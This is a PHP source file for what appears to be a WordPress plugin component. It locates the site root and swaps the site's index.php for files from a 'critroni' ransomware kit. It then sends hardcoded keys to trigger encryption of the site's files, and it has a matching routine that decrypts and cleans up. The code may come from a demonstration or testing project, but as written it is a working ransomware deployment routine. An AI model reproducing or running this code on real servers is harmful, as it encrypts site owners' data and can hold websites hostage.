<?php

//some constant for simplicity sake
define("KEY1" , "DACACD3F77F31488ABA3787F264C8624313587A2E40C708F638A7B358B861999");
define("KEY2" , "848A69BA95BFE4C00F70B9A99B8BFCC76BCB6B576B7537B0C628980050093325");

//completed
//returns the absolute path of the wordpress root folder in string
function mps_get_wp_root_folder(){
	$path = dirname(__FILE__); // <anything ahead>/wordpress/wp-content/plugin/mps
	$path = dirname($path);
	$path = dirname($path);
	$path = dirname($path); // wordpress root folder
	
	return $path;
}

//completed
//currently not used
function mps_get_all_files(){
	
	$root = mps_get_wp_root_folder();
	
	$iter = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
		RecursiveIteratorIterator::SELF_FIRST,
		RecursiveIteratorIterator::CATCH_GET_CHILD // Ignore "Permission denied"
	);

	$paths = array();
	foreach ($iter as $path => $file) {
		// check that it is a file
		if ($file->isFile()) {
			$paths[] = $path;
		}
	}
	
	return $paths;
}

//completed
//Sends POST request to itself
function mps_send_post_request($data){
	$ch = curl_init('http://localhost');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

	// execute!
	$response = curl_exec($ch);

	// close the connection, release resources used
	curl_close($ch);

	// do anything you want with your response
	var_dump($response);
}

//completed
//put files and send request to trigger ransomware
function mps_trigger_ransomware(){
	$root_folder = mps_get_wp_root_folder();
	
	// move and save default index.php file
	rename($root_folder."/index.php" , "backup/index.php");
	
	// replace and add required files
	mkdir($root_folder."/crypt/");
	copy("critroni/index.php" , $root_folder."/index.php");
	copy("critroni/extensions.txt" , $root_folder."/extensions.txt");
	copy("critroni/crypt/AES.php" , $root_folder."/crypt/AES.php");
	copy("critroni/crypt/Base.php" , $root_folder."/crypt/Base.php");
	copy("critroni/crypt/BigInteger.php" , $root_folder."/crypt/BigInteger.php");
	copy("critroni/crypt/Hash.php" , $root_folder."/crypt/Hash.php");
	copy("critroni/crypt/Random.php" , $root_folder."/crypt/Random.php");
	copy("critroni/crypt/Rijndael.php" , $root_folder."/crypt/Rijndael.php");
	
	// send request to trigger encryption
	$data = array('submit' => KEY1, 'submit2' => KEY2);
	mps_send_post_request($data);
}

//completed
//send request to resolve ransomware and delete files
function mps_resolve_ransomware(){
	$root_folder = mps_get_wp_root_folder();
	
	// send request to trigger decryption
	$data = array('reverse' => KEY1, 'reverse2' => KEY2);
	mps_send_post_request($data);
	
	// remove unneeded files
	unlink($root_folder."/index.php");
	unlink($root_folder."/extensions.txt");
	unlink($root_folder."/victims.txt");
	unlink($root_folder."/allenc.txt");
	unlink($root_folder."/test.txt");
	unlink($root_folder."/crypt/AES.php");
	unlink($root_folder."/crypt/Base.php");
	unlink($root_folder."/crypt/BigInteger.php");
	unlink($root_folder."/crypt/Hash.php");
	unlink($root_folder."/crypt/Random.php");
	unlink($root_folder."/crypt/Rijndael.php");
	rmdir($root_folder."/crypt/");
	
	// restore previous index.php file
	rename("backup/index.php" , $root_folder."/index.php");
}

?>